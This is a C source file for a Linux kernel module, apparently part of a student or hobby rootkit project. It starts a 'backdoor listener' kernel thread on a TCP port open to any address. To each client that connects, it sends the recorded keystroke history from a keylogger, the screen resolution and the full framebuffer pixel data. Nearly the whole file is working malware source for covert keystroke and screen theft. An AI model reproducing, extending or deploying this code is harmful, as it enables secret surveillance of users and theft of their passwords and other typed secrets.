#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/tcp.h>
#include <linux/socket.h>
#include <linux/kthread.h>
#include <linux/sched.h>

#include "socket.h"
#include "snapshot.h"
#include "keylogger.h"

static struct socket *sock;

static struct task_struct *listener;

static void send_message(struct socket *conn)
{
    struct msghdr msg = {0};
    struct buffer_tela fb;

    struct kvec iov = {
        .iov_base = read_key_history(),
        .iov_len = BUFFER_SIZE,
    };
    int b;

    coleta_buffer_tela(&fb);

    printk(KERN_INFO "sending keyboard data\n");
    kernel_sendmsg(conn, &msg, &iov, 1, BUFFER_SIZE);

    ((int *)iov.iov_base)[0] = fb.xres;
    ((int *)iov.iov_base)[1] = fb.yres;

    printk(KERN_INFO "sending resolution\n");
    kernel_sendmsg(conn, &msg, &iov, 1, sizeof(int) * 2);

    printk(KERN_INFO "starting send pixel data\n");
    for (b = 0; b < 3 * fb.xres * fb.yres; b += BUFFER_SIZE)
    {
        memcpy(iov.iov_base, fb.rgb_buffer + b, BUFFER_SIZE);
        kernel_sendmsg(conn, &msg, &iov, 1, BUFFER_SIZE);
    }
    printk(KERN_INFO "start sending padding data\n");

    memcpy(iov.iov_base, fb.rgb_buffer,
           BUFFER_SIZE - ((3 * fb.xres * fb.yres) % BUFFER_SIZE));

    kernel_sendmsg(conn, &msg, &iov, 1,
                   BUFFER_SIZE - ((3 * fb.xres * fb.yres) % BUFFER_SIZE));

    printk(KERN_INFO "done\n");

    limpa_buffer_tela(&fb);
    kfree(iov.iov_base);
}

static int backdoor_socket_listen(void *_)
{
    while (true)
    {
        struct socket *conn = sock_alloc();
        int err;
        conn->type = sock->type;
        conn->ops = sock->ops;

        printk(KERN_INFO "backdoor: waiting on accept\n");

        err = sock->ops->accept(sock, conn, O_RDWR, true);
        if (err < 0)
        {
            conn->ops->release(conn);

            if (kthread_should_stop())
            {
                break;
            }

            printk(KERN_ERR
                   "backdoor: error accepting connection, exiting\n");
            return err;
        }
        printk(KERN_INFO "backdoor: accepted connection\n");

        // if we accepted a client normally, send the backdoor message
        send_message(conn);

        // and close the connection when we are done
        conn->ops->shutdown(conn, SHUT_RDWR);
        conn->ops->release(conn);
    }

    printk(KERN_INFO "backdoor: exiting listener\n");
    return 0;
}

int __init backdoor_socket_init(int port)
{
    int err;
    struct sockaddr_in sin;

    // set the address: connect with anyone in the specified port
    memset(&sin, 0, sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = htonl(INADDR_ANY);
    sin.sin_port = htons(port);

    // ceate the socket, it should be a kernel socket because we use data alloc'd
    // in kernelspace
    err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP,
                           &sock);
    if (err < 0)
    {
        goto errl1;
    }

    // bind the address to the socket
    err = sock->ops->bind(sock, (struct sockaddr *)&sin, sizeof(sin));
    if (err < 0)
    {
        goto errl2;
    }

    // listen on that socket, with a certain queue size
    err = sock->ops->listen(sock, 3);
    if (err < 0)
    {
        goto errl2;
    }

    // start the listener process
    listener =
        kthread_run(backdoor_socket_listen, NULL, "backdoor listener");
    if (listener == NULL)
    {
        err = PTR_ERR(listener);
        goto errl2;
    }

    return 0;

errl2:
    sock_release(sock);
errl1:
    return err;
}

void __exit backdoor_socket_exit(void)
{
    sock->ops->shutdown(sock, SHUT_RDWR);
    kthread_stop(listener);
    sock->ops->release(sock);
}